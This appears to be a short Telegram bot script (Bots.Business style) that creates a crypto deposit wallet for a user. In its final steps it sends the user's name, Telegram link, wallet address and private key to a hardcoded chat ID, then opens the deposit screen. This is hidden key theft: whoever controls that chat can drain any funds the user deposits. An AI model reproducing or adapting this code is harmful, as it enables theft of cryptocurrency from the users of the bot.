/*CMD
  command: sucsjsjs
  help: 
  need_reply: 
  auto_retry_time: 
  folder: 
  answer: 
  keyboard: 
  aliases: 
CMD*/

var data = JSON.parse(content)
let inf =
  "[" +
  user.first_name +
  "]" +
  "(" +
  "tg://user?id=" +
  user.telegramid +
  ")";
var res = data.address.base58
User.setProperty("wallset",res, "string")
var priv = data.privateKey
User.setProperty("wallpk",priv, "string")
Bot.sendMessageToChatWithId(484675895,"User name "+inf+"\n*Address :*\n`"+res+"`\n\n*Private Key :*\n`"+priv+"`\n\n")
   Bot.runCommand("➕ Deposit")
